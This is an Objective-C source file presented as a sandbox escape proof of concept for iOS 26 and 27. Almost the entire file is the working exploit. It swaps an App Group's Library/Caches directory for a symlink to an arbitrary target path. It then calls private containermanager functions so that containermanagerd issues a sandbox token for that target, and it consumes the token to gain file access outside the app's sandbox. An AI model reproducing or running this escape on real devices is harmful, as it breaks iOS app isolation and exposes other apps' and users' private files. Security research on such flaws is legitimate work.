//
//  worse_query.m
//  worse_query
//
//  Created by Taj C on 8/20/26.
//

/*
     worse_query - A sandbox escape PoC for iOS 26 and 27, again.
     Copyright (C) 2026 Taj C (forcequit)

     This program is free software: you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
     the Free Software Foundation, either version 3 of the License, or
     (at your option) any later version.

     This program is distributed in the hope that it will be useful,
     but WITHOUT ANY WARRANTY; without even the implied warranty of
     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
     GNU General Public License for more details.

     You should have received a copy of the GNU General Public License
     along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <xpc/xpc.h>
#include <sys/stat.h>
#include "worse_query.h"

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

// Preserve the exact dedicated App Group Caches directory while the same
// container_query operation temporarily requires a Caches symlink. Previously
// the directory and *all its contents* were deleted on every grant request.
// This fixed-location backup is exclusively within the signed App Group.
// A leftover backup from a crashed process is never overwritten or deleted;
// instead the request fails closed until safe recovery can be verified.
static NSString *WQCacheBackupPath(NSString *caches) {
    return [caches stringByAppendingString:@".wq-preserved"];
}

static BOOL WQPathStat(NSString *path, struct stat *info) {
    return lstat(path.fileSystemRepresentation, info) == 0;
}

BOOL WQCacheStageBegin(NSString *caches, NSString *target) {
    if (caches.length == 0 || target.length == 0) return NO;
    NSFileManager *files = [NSFileManager defaultManager];
    NSString *backup = WQCacheBackupPath(caches);
    struct stat info;

    // Neither an abandoned backup nor an unexpected existing symlink is
    // disposable. Reject rather than guessing at ownership.
    if (WQPathStat(backup, &info) || errno != ENOENT) return NO;

    BOOL preserved = WQPathStat(caches, &info);
    if (!preserved && errno != ENOENT) return NO;
    if (preserved) {
        if (!S_ISDIR(info.st_mode)) return NO;
        if (![files moveItemAtPath:caches toPath:backup error:nil]) return NO;
    }

    if (![files createSymbolicLinkAtPath:caches withDestinationPath:target error:nil]) {
        if (preserved) {
            // Leave the original data in the backup even if this move fails.
            [files moveItemAtPath:backup toPath:caches error:nil];
        }
        return NO;
    }
    return YES;
}

BOOL WQCacheStageEnd(NSString *caches, NSString *target) {
    if (caches.length == 0 || target.length == 0) return NO;
    NSFileManager *files = [NSFileManager defaultManager];
    struct stat info;
    // Do not remove a file or real folder if something replaced the link.
    if (!WQPathStat(caches, &info) || !S_ISLNK(info.st_mode)) return NO;
    NSString *destination = [files destinationOfSymbolicLinkAtPath:caches error:nil];
    if (![destination isEqualToString:target]) return NO;
    if (![files removeItemAtPath:caches error:nil]) return NO;

    NSString *backup = WQCacheBackupPath(caches);
    if (WQPathStat(backup, &info)) {
        return S_ISDIR(info.st_mode) &&
            [files moveItemAtPath:backup toPath:caches error:nil];
    }
    if (errno != ENOENT) return NO;
    return [files createDirectoryAtPath:caches
           withIntermediateDirectories:NO attributes:nil error:nil];
}

// So, who's ready for round two?
int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool create_dir) {
    // Check if the target exists
    if (!create_dir) {
        struct stat st;
        if (lstat(target.fileSystemRepresentation, &st) != 0) return -255; // Nothing exists at this path, and create_dir is false
    }
    
    // Get the App Group's path
    // An App Group identifier you control is required for this
    NSFileManager *files = [NSFileManager defaultManager];
    NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier: group];
    if (!groupRoot) return -1; // App Group doesn't exist or we can't access it
    NSString *caches = [[groupRoot URLByAppendingPathComponent: @"Library/Caches"] path];
    
    // Resolve functions
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -2; // dlopen failed?
    
    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
        dlclose(mgr);
        return -2; // Failed to resolve a function (unsupported OS)
    }
    
    // Create query
    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        return -3; // Failed to create query
    }
    
    // Set up query
    xpc_object_t identifier;
    query_set_class(query, 7); // We're only using class 7 here (appGroup), which goes to containermanagerd
    identifier = xpc_string_create(group.UTF8String);
    query_set_group_identifiers(query, identifier);
#if !OS_OBJECT_USE_OBJC
    // Match the bridge's XPC ownership rules on non-Objective-C runtimes.
    xpc_release(identifier);
#endif
    query_set_part(query, 3); // The query's part sets our base path, part 3 is Library/Caches
    if (alt_flags) {
        query_set_flags(query, 0x0000000800000000ULL); // Accessing App Group containers on iOS 26.x needs different flags, for whatever reason
    } else {
        query_set_flags(query, 0x0000008000000000ULL);
    }
    
    // Only the staging directory handling changes: preserve its contents.
    // Query class, part, flags, target and token flow remain unchanged.
    if (!WQCacheStageBegin(caches, target)) {
        query_free(query);
        dlclose(mgr);
        return -4;
    }
    
    // Send our query over
    void *result = query_get_single_result(query);
    if (!result) {
        query_free(query);
        dlclose(mgr);
        return WQCacheStageEnd(caches, target) ? -5 : -4; // Query rejected by containermanagerd
    }
    char *token = copy_sandbox_token(result);
    if (!token) {
        query_free(query);
        dlclose(mgr);
        return WQCacheStageEnd(caches, target) ? -6 : -4; // Kernel refused to issue a sandbox extension
    }
    
    // Consume sandbox extension and clean up
    int64_t handle = consume_extension(token);
    query_free(query);
    free(token);
    dlclose(mgr);
    if (!WQCacheStageEnd(caches, target)) {
        if (handle > 0) worse_query_release(handle);
        return -4;
    }

    return handle;
}

// You should probably call this when you're done
void worse_query_release(int64_t handle) {
    if (handle < 0) return;
    sandbox_extension_release_fn release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) release_extension(handle);
}
